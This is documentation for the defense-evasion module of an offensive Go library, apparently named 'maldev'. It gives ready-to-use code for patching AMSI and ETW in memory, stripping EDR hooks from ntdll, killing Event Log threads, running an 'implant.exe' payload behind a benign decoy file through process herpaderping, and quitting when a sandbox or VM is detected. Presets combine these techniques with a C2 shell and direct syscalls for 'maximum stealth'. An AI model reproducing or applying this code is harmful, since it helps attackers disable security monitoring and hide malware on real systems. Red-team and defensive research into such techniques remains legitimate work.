# Evasion Techniques

[<- Back to README](../README.md)

## Overview

| Package | Technique | MITRE ATT&CK | Detection | Platform |
|---------|-----------|---------------|-----------|----------|
| `evasion/amsi` | AMSI memory patching | T1562.001 -- Impair Defenses | Medium | Windows |
| `evasion/etw` | ETW event write patching | T1562.001 -- Impair Defenses | Medium | Windows |
| `evasion/unhook` | ntdll.dll restoration | T1562.001 -- Impair Defenses | High | Windows |
| `evasion/acg` | Arbitrary Code Guard policy | T1562.001 -- Impair Defenses | Low | Windows 10+ |
| `evasion/blockdlls` | Block non-Microsoft DLLs | T1562.001 -- Impair Defenses | Low | Windows 10+ |
| `evasion/phant0m` | Event Log thread termination | T1562.002 -- Disable Event Logging | High | Windows |
| `evasion/herpaderping` | Process image tampering via kernel section cache | T1055 -- Process Injection | Medium | Windows 10+ |
| `evasion/antidebug` | Debugger detection | T1622 -- Debugger Evasion | Low | Cross-platform |
| `evasion/antivm` | VM/hypervisor detection | T1497.001 -- System Checks | Low | Cross-platform |
| `evasion/timing` | CPU-burning delays | T1497.003 -- Time Based Evasion | Low | Cross-platform |
| `evasion/sandbox` | Multi-factor sandbox detection | T1497 -- Sandbox Evasion | Low | Cross-platform |
| `evasion/preset` | Composable technique presets (Minimal/Stealth/Aggressive) | -- | -- | Windows |

## AMSI Bypass (`evasion/amsi`)

Patches `AmsiScanBuffer` in memory to return `S_OK` (clean), and flips a conditional jump in `AmsiOpenSession` to prevent session initialization. Returns nil if amsi.dll is not loaded.

```go
import "github.com/oioio-space/maldev/evasion/amsi"

// Patch both AmsiScanBuffer and AmsiOpenSession
err := amsi.PatchAll(nil) // nil = WinAPI, or pass a *wsyscall.Caller

// Or patch individually
err = amsi.PatchScanBuffer(nil)
err = amsi.PatchOpenSession(nil)
```

**Advantages:** Fast, reliable, works in-process. Returns nil gracefully when AMSI is not loaded.
**Limitations:** EDR may monitor VirtualProtect calls on amsi.dll memory pages.

## ETW Bypass (`evasion/etw`)

Overwrites all five ETW event writing functions (`EtwEventWrite`, `EtwEventWriteEx`, `EtwEventWriteFull`, `EtwEventWriteString`, `EtwEventWriteTransfer`) with `xor rax, rax; ret` (48 33 C0 C3). Also patches `NtTraceEvent` with a single `RET`.

```go
import "github.com/oioio-space/maldev/evasion/etw"

err := etw.PatchAll(nil)     // patches all ETW functions + NtTraceEvent
err = etw.Patch(nil)      // patches only the 5 ETW functions
err = etw.PatchNtTraceEvent(nil) // patches only NtTraceEvent
```

**Advantages:** Silences all ETW telemetry from the current process.
**Limitations:** In-memory ntdll patches are detectable by integrity checks.

## ntdll Unhooking (`evasion/unhook`)

Restores original ntdll.dll function bytes from a clean copy to remove EDR user-mode hooks. Three methods ordered by increasing sophistication:

```go
import "github.com/oioio-space/maldev/evasion/unhook"

// Restore first 5 bytes of a single function
err := unhook.ClassicUnhook("NtAllocateVirtualMemory")

// Replace entire .text section from disk copy
err = unhook.FullUnhook()

// Read pristine ntdll from a suspended child process (Perun's Fart)
err = unhook.PerunUnhook()
```

**Advantages:** Removes ALL user-mode hooks when using FullUnhook or PerunUnhook.
**Limitations:** Reading ntdll from disk or spawning child processes is monitored by EDR.

## Phant0m (`evasion/phant0m`)

Enumerates and terminates threads belonging to the Windows Event Log service (svchost.exe hosting EventLog), preventing new events from being written while the service appears to still be running.

```go
import "github.com/oioio-space/maldev/evasion/phant0m"

err := phant0m.Kill()
```

**Advantages:** Suppresses event log recording without stopping the service.
**Limitations:** High detection risk -- killing Event Log threads triggers alerts in mature environments.

## Process Herpaderping (`evasion/herpaderping`) -- T1055

Executes a PE while the file on disk shows different (benign) content. Exploits the timing gap between process creation and EDR security callbacks.

**How it works:** The kernel caches the PE image in memory when NtCreateSection(SEC_IMAGE) is called. The file on disk can then be overwritten with a decoy before the initial thread is created -- EDR sees the decoy, not the original payload.

```go
// Execute a payload with svchost.exe as decoy
err := herpaderping.Run(herpaderping.Config{
    PayloadPath: "implant.exe",
    TargetPath:  `C:\Temp\legit.exe`,
    DecoyPath:   `C:\Windows\System32\svchost.exe`,
})

// Via composable interface
techniques := []evasion.Technique{
    amsi.ScanBufferPatch(),
    herpaderping.Technique(herpaderping.Config{
        PayloadPath: "implant.exe",
        TargetPath:  `C:\Temp\legit.exe`,
    }),
}
evasion.ApplyAll(techniques, nil)
```

| Aspect | Value |
|--------|-------|
| Detection | Sysmon Event ID 25 (ProcessTampering) |
| Advantage | File on disk always shows benign content |
| Limitation | Requires write access to target path |

## Sandbox Detection (`evasion/sandbox`)

Aggregates multiple environment checks into a single assessment: debugger detection, VM detection, hardware thresholds (CPU cores, RAM, disk), suspicious usernames/hostnames, analysis tool processes, fake domain DNS resolution, and CPU-burning waits.

```go
import "github.com/oioio-space/maldev/evasion/sandbox"

checker := sandbox.New(sandbox.DefaultConfig())
if sandboxed, reason, _ := checker.IsSandboxed(ctx); sandboxed {
    os.Exit(0) // bail out of sandbox
}
```

**Advantages:** Multi-factor detection reduces false negatives.
**Limitations:** Combined behavior pattern may itself be flagged by advanced sandboxes.

### Parameterizable Config

Multi-factor sandbox detection with tunable thresholds and check behavior.

```go
import "github.com/oioio-space/maldev/evasion/sandbox"

// Quick check
checker := sandbox.New(sandbox.DefaultConfig())
detected, reason, _ := checker.IsSandboxed(ctx)

// Detailed results
results := checker.CheckAll(ctx)
for _, r := range results {
    if r.Detected {
        fmt.Printf("[!] %s: %s\n", r.Name, r.Detail)
    }
}

// Custom config
cfg := sandbox.DefaultConfig()
cfg.MinRAMGB = 8
cfg.StopOnFirst = false
cfg.BadProcesses = append(cfg.BadProcesses, "custom-analyzer")
```

## Composable Evasion (`evasion/preset`)

Evasion techniques implement the `evasion.Technique` interface and can be composed into slices for batch application. Three presets are provided for common scenarios.

```go
import (
    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/evasion/preset"
    "github.com/oioio-space/maldev/evasion/unhook"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Presets — ready to use
cfg := &shell.Config{
    Evasion: preset.Stealth(), // AMSI + ETW + unhook common functions
}

// Custom composition
cfg = &shell.Config{
    Evasion: []evasion.Technique{
        amsi.ScanBufferPatch(),
        etw.All(),
        unhook.Classic("NtAllocateVirtualMemory"),
        unhook.Classic("NtCreateThreadEx"),
    },
}

// With direct syscalls for maximum stealth
caller := wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())
evasion.ApplyAll(preset.Stealth(), caller)
```

| Preset | Techniques | Detection Risk |
|--------|-----------|----------------|
| `preset.Minimal()` | AMSI + ETW | Low |
| `preset.Stealth()` | + unhook 10 common NT functions | Medium |
| `preset.Aggressive()` | + full ntdll unhook + ACG + BlockDLLs | High |

## Hook Detection (`evasion/unhook`)

Detect which ntdll functions have been hooked by EDR and inspect their prologues.

```go
import "github.com/oioio-space/maldev/evasion/unhook"

// Detect which functions are hooked by EDR
hooked, _ := unhook.DetectHooked(unhook.CommonHookedFunctions)
fmt.Println("Hooked:", hooked)

// Inspect prologues
infos, _ := unhook.Inspect(unhook.CommonHookedFunctions)
for _, info := range infos {
    status := "clean"
    if info.Hooked { status = "HOOKED" }
    fmt.Printf("%-30s %s  %02X\n", info.Name, status, info.Prologue)
}
```

## AntiVM -- Parameterizable Config (`evasion/antivm`)

VM detection supports bitmask-based check selection for fine-grained control over which detection dimensions to evaluate.

```go
import "github.com/oioio-space/maldev/evasion/antivm"

// Default: check everything
vendor := antivm.DetectVM()

// Custom: only check processes and CPUID (fast, no disk access)
cfg := antivm.Config{
    Checks: antivm.CheckProcess | antivm.CheckCPUID,
}
vendor, _ := antivm.Detect(cfg)

// Detect ALL matching vendors
vendors, _ := antivm.DetectAll(antivm.DefaultConfig())
```
